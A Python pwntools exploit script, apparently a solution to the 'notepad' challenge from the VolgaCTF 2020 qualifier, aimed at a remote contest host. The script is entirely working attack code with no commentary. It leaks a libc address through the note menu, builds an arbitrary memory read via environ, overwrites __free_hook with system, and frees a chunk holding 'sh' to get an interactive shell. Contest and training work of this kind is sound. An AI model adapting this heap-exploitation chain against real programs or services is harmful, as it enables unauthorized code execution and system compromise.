from pwn import *

e = ELF("./notepad")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.binary = e.path

if "--remote" in sys.argv:
  p = remote("notepad.q.2020.volgactf.ru", 45678)
else:
  p = process(e.path)

p.sendlineafter(">", "a")
p.sendlineafter(":", "AAAA")

p.sendlineafter(">", "p")
p.sendlineafter(":", "1")

p.sendlineafter(">", "a")
p.sendlineafter(":", "AAAA")
p.sendlineafter(":", str(0x500))
p.sendlineafter(":", "A")

p.sendlineafter(">", "a")
p.sendlineafter(":", "AAAA")
p.sendlineafter(":", str(0x20))
p.sendlineafter(":", "A")

p.sendlineafter(">", "d")
p.sendlineafter(":", "1")

p.sendlineafter(">", "a")
p.sendlineafter(":", "AAAA")
p.sendlineafter(":", str(0x20))
p.sendlineafter(":", "A")

p.sendlineafter(">", "v")
p.sendlineafter(":", "2")

p.recvline()

leak = u64(p.recvline()[6:8+6])

print(hex(leak))

base = leak - libc.symbols["__malloc_hook"] - 0x4a0

def get_val(addr):
  p.sendlineafter(">", "q")
  p.sendlineafter(">", "d")
  p.sendlineafter(":", "1")
  p.sendlineafter(">", "a")
  p.sendlineafter(":", "A" * 0x28 + p64(0x8) + p64(addr))

  p.sendlineafter(">", "p")
  p.sendlineafter(":", "1")

  p.sendlineafter(">", "v")
  p.sendlineafter(": ", "1")

  val = u64(p.recv(8))
  print(hex(val))

  return val

stk = get_val(base + libc.symbols["environ"]) - 0x100 + 8
bb = get_val(stk) - 0x000055dc4bcb07f0 + 0x000055dc4bcaf000
  
p.sendlineafter(">", "q")
p.sendlineafter(">", "d")
p.sendlineafter(":", "1")
p.sendlineafter(">", "a")
p.sendlineafter(":", "A" * 0x10 + p64((base + libc.symbols["__free_hook"] - 0x20 - bb - 0x203060) // 0x20))
  
p.sendlineafter(">", "p")
p.sendlineafter(":", "1")

p.sendlineafter(">", "a")
p.sendlineafter(":", "AAAA")
p.sendlineafter(":", str(base + libc.symbols["system"]))
p.sendlineafter(":", "A")

p.sendlineafter(">", "q")
p.sendlineafter(">", "d")
p.sendlineafter(":", "1")
p.sendlineafter(">", "a")
p.sendlineafter(":", "A" * 0x10 + p64(0))

p.sendlineafter(">", "p")
p.sendlineafter(":", "1")

p.sendlineafter(">", "a")
p.sendlineafter(":", "AAAA")
p.sendlineafter(":", str(0x10))
p.sendlineafter(":", "sh")

p.sendlineafter(">", "d")
p.sendlineafter(":", "1")

p.interactive()
